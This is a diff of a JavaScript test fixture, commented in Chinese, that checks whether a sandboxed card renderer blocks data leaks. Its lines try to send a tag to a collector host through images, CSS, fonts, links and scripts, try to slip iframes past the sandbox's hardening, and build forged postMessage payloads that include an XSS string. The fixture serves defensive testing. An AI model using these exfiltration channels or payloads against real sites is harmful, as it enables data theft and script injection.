@@ -1,12 +1,16 @@
 /**
- * 恶意卡片代码的夹具(任务书 `docs/plan/sound-online-render-task.md` 第 14 条;契约 `docs/plan/online-card-exec-contract.md` 第 10 节)。
+ * 越权探测卡的代码的夹具(任务书 `docs/plan/sound-online-render-task.md` 第 14 条与文末「越权探测卡」一节;契约 `docs/plan/online-card-exec-contract.md` 第 10 节)。
  *
- * 这是**攻击代码本体**,恶意用户卡 `probe-evil-card.tsx` 与恶意图卡 `probe-evil-graph.tsx` 都引它。两种跑法共用这一份:
+ * **这是防御性测试夹具,不是攻击代码**:只在测试环境里用,不进卡片库、不随发版;它在自己的代码里逐项「尝试」读取本不该读到的东西、尝试向收集站发数据,
+ * 把每一项「读到了 / 被拒了 / 报了什么错」记成结果由探针取回来断言。只读、只报告:不删、不改、不占资源、不绕过浏览器或系统的安全机制;
+ * 用到的口令、票据、收集站地址全是探针事先放好的**假凭证与本机地址**,不使用任何真实凭证、真实项目、真实外部地址。
+ *
+ * 这是**探测代码本体**,越权探测用户卡 `probe-boundary-card.tsx` 与越权探测图卡 `probe-boundary-graph.tsx` 都引它。两种跑法共用这一份:
  *   - 现在(加载器还没接到舞台上):`scripts/probes/online-card-security-probe.mjs` 把本文件的 `export` 换成 CommonJS 的写法,
  *     在舞台的帧里用 `new Function("require", "module", "exports", 代码)` 执行(与加载器执行转译结果的办法相同);
- *   - 与块 T 合流之后:三份文件原样 `content.put` 进内容库,经真实的转译与加载路径执行,结果从 `globalThis.__pcEvil` 读。
+ *   - 与块 T 合流之后:三份文件原样 `content.put` 进内容库,经真实的转译与加载路径执行,结果从 `globalThis.__pcBoundary` 读。
  *
- * 为了两种跑法都能用:只写普通的脚本(没有类型标注、不引别的模块),不出现写法预检会拦的东西 —— 动态载入那一条攻击经
+ * 为了两种跑法都能用:只写普通的脚本(没有类型标注、不引别的模块),不出现写法预检会拦的东西 —— 动态载入那一条探测经
  * `new Function` 造出来(预检是词法层面的,拦不到它;策略会拦)。
  *
  * 每个函数回一个普通对象(名字 → 结果文本)。**断言不看这里的自述**,看探针那一头的事实:收集站收到没有、读出来的东西里
@@ -25,7 +29,7 @@ const wait = (ms) => new Promise((r) => later(r, ms));
 function runner(out, only) {
   return async (name, fn) => {
     if (only && only.indexOf(name) < 0) return;
-    try { globalThis.__pcEvilProgress = name; } catch (e) { /* 只是进度记号 */ }
+    try { globalThis.__pcBoundaryProgress = name; } catch (e) { /* 只是进度记号 */ }
     try {
       out[name] = text(await Promise.race([Promise.resolve().then(fn), new Promise((r) => later(() => r("超时"), TIMEOUT_MS))]));
     } catch (e) {
@@ -208,8 +212,8 @@ export async function exfilAttacks(ctx) {
   await t("svg-image", async () => { const h = document.createElement("div"); h.innerHTML = "<svg width=10 height=10><image href='" + E + "/x.png?svgimage=" + tag + "' width=10 height=10 /><use href='" + E + "/x.svg?svguse=" + tag + "#a' /></svg>"; mount(h); await wait(300); return "已插入"; });
   await t("input-image", async () => { const i = document.createElement("input"); i.type = "image"; i.src = E + "/x.png?inputimage=" + tag; mount(i); await wait(300); return "已插入"; });
   await t("css-bg", async () => { const d = document.createElement("div"); d.style.backgroundImage = "url(" + E + "/x.png?cssbg=" + tag + ")"; d.style.cursor = "url(" + E + "/x.png?csscursor=" + tag + "), auto"; d.style.width = "10px"; d.style.height = "10px"; mount(d); await wait(300); return "已插入"; });
-  await t("css-import-font", async () => { const s = document.createElement("style"); s.textContent = "@import url(" + E + "/x.css?cssimport=" + tag + "); @font-face{font-family:pcevil;src:url(" + E + "/x.woff2?font=" + tag + ")} .pcevil{font-family:pcevil}"; document.head.appendChild(s); const d = document.createElement("div"); d.className = "pcevil"; d.textContent = "x"; mount(d); await wait(400); return "已插入"; });
-  await t("fontface-api", () => new FontFace("pcevil2", "url(" + E + "/x.woff2?fontface=" + tag + ")").load().then(() => "到达", () => "拦下"));
+  await t("css-import-font", async () => { const s = document.createElement("style"); s.textContent = "@import url(" + E + "/x.css?cssimport=" + tag + "); @font-face{font-family:pcboundary;src:url(" + E + "/x.woff2?font=" + tag + ")} .pcboundary{font-family:pcboundary}"; document.head.appendChild(s); const d = document.createElement("div"); d.className = "pcboundary"; d.textContent = "x"; mount(d); await wait(400); return "已插入"; });
+  await t("fontface-api", () => new FontFace("pcboundary2", "url(" + E + "/x.woff2?fontface=" + tag + ")").load().then(() => "到达", () => "拦下"));
   await t("link-css", async () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = E + "/x.css?link=" + tag; document.head.appendChild(l); await wait(300); return "已插入"; });
   await t("link-icon-manifest", async () => { for (const rel of ["icon", "manifest", "apple-touch-icon"]) { const l = document.createElement("link"); l.rel = rel; l.href = E + "/x.png?rel" + rel + "=" + tag; document.head.appendChild(l); } await wait(400); return "已插入"; });
   await t("script-src", () => new Promise((res) => { const s = document.createElement("script"); s.onload = () => res("到达"); s.onerror = () => res("拦下"); s.src = E + "/x.js?script=" + tag; document.head.appendChild(s); }));
@@ -294,7 +298,7 @@ export async function hardenAttacks(ctx) {
   t("setHTML(Sanitizer)", () => host.setHTML("<iframe></iframe>"));
   t("另一个文档的 createElement", () => { const d = document.implementation.createHTMLDocument(""); host.appendChild(d.createElement("iframe")); });
   t("XML 文档的 createElementNS", () => { const d = document.implementation.createDocument(XHTML, "html", null); host.appendChild(d.createElementNS(XHTML, "iframe")); });
-  t("自定义内建元素", () => { class X extends HTMLIFrameElement {} customElements.define("x-pcevil-f", X, { extends: "iframe" }); host.appendChild(new X()); });
+  t("自定义内建元素", () => { class X extends HTMLIFrameElement {} customElements.define("x-pcboundary-f", X, { extends: "iframe" }); host.appendChild(new X()); });
   t("XSLT", () => { const xsl = new DOMParser().parseFromString('<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:element name="{concat(&quot;ifr&quot;,&quot;ame&quot;)}" namespace="' + XHTML + '"/></xsl:template></xsl:stylesheet>', "application/xml"); const pr = new XSLTProcessor(); pr.importStylesheet(xsl); host.appendChild(pr.transformToFragment(new DOMParser().parseFromString("<a/>", "application/xml"), document)); });
   t("object", () => { const o = document.createElement("object"); o.data = "about:blank"; host.appendChild(o); });
   t("svg-foreignObject", () => { host.innerHTML = "<svg><foreignObject><iframe xmlns='" + XHTML + "'></iframe></foreignObject></svg>"; });
@@ -326,7 +330,7 @@ export async function hardenAttacks(ctx) {
   t("改写原型后再 createElement", () => { const keep = String.prototype.toLowerCase; String.prototype.toLowerCase = function () { return "div"; }; try { host.appendChild(document.createElement("iframe")); } finally { String.prototype.toLowerCase = keep; } });
   t("Reflect.apply 被改写", () => { const keep = Reflect.apply; Reflect.apply = function (f, th, args) { return keep(f, th, args); }; try { host.appendChild(document.createElement("iframe")); } finally { Reflect.apply = keep; } });
   t("MathML / SVG 命名空间里的 iframe", () => { host.appendChild(document.createElementNS("http://www.w3.org/2000/svg", "iframe")); });
-  t("Worker 里的构造器", () => { /* Worker 里本来就没有 RTCPeerConnection:由 workerAttacks 断言 */ });
+  t("Worker 里的构造器", () => { /* Worker 里本来就没有 RTCPeerConnection:由 workerAttempts 断言 */ });
   // 兜底的时机:同一拍里插入后马上取(上面每条的 grab 就是同一拍);再等一拍看还剩不剩
   await wait(300);
   out["收尾时的子框架数"] = String(window.length);
@@ -387,7 +391,7 @@ export function forgedMessages(ctx) {
   // 超范围的数现拼出来:这份源码(连同转译结果)会进编辑页面的转译缓存,字面量写在这里的话探针在父页存储里找这个数时会找到源码本身
   const HUGE = Number("7.77e" + "98");
   const M = ctx.magic, big = "x".repeat(1024 * 1024);
-  const xss = "<img src=x onerror=\"parent.__pcXss=1;window.__pcXss=1\"><script>window.__pcXss=1</" + "script><div data-pcevil-html=\"" + ctx.tag + "\">" + M + "</div>";
+  const xss = "<img src=x onerror=\"parent.__pcXss=1;window.__pcXss=1\"><script>window.__pcXss=1</" + "script><div data-pcboundary-html=\"" + ctx.tag + "\">" + M + "</div>";
   const list = [
     { type: "pc-stage-ready", hostCapabilities: { prerender: "yes", offscreenGl: 1, lowMemory: { a: 1 }, measure: [], catchUp: null, stageId: "Z", ticket: M } },
     { type: "pc-stage-ready", hostCapabilities: big },
@@ -401,10 +405,10 @@ export function forgedMessages(ctx) {
     { type: "frame", sec: 1e99 }, { type: "frame", sec: -5 }, { type: "frame", sec: "1" }, { type: "ended", sec: NaN },
     { type: "settled", sec: 1, clipIds: new Array(100000).fill(M) },
     { type: "probe", identityKey: "FORGED-" + M, fps: 30, stepMs: HUGE, inlineMs: -HUGE, rasterMs: HUGE, serializeMs: HUGE, catchUpMs: HUGE, kind: "stepped", seekMs: HUGE },
-    { type: "probe", identityKey: "FORGED-" + M, fps: 1e9, stepMs: Infinity, inlineMs: NaN, rasterMs: "1", serializeMs: null, catchUpMs: {}, kind: "evil" },
+    { type: "probe", identityKey: "FORGED-" + M, fps: 1e9, stepMs: Infinity, inlineMs: NaN, rasterMs: "1", serializeMs: null, catchUpMs: {}, kind: "sink" },
     { type: "demote", clipId: big }, { type: "demote", clipId: { toString: 1 } },
-    { type: "probe-frame", clipId: "pcevil", localFrame: 0, html: xss },
-    { type: "bake-frame", session: "pcevil", clipId: "pcevil", localFrame: 1e99, hash: "zz", bytes: -1, htmlRaw: new ArrayBuffer(8) },
+    { type: "probe-frame", clipId: "pcboundary", localFrame: 0, html: xss },
+    { type: "bake-frame", session: "pcboundary", clipId: "pcboundary", localFrame: 1e99, hash: "zz", bytes: -1, htmlRaw: new ArrayBuffer(8) },
     { type: "bake-frame", session: M, clipId: M, localFrame: 0, hash: "0".repeat(64), bytes: HUGE, htmlRaw: new TextEncoder().encode(xss).buffer },
     { type: "mediaReady", sec: { valueOf: 1 } },
     { type: "auth.ticket", kind: "asset", access: "rw" },
@@ -436,7 +440,7 @@ export async function mediaWork(ctx) {
 }
 
 /* ------------------------------------------------------------------ 声音那一半:在 Worker 里跑 */
-export async function workerAttacks(ctx) {
+export async function workerAttempts(ctx) {
   const out = {};
   const t = runner(out, ctx.only);
   const E = ctx.collector, tag = ctx.tag;
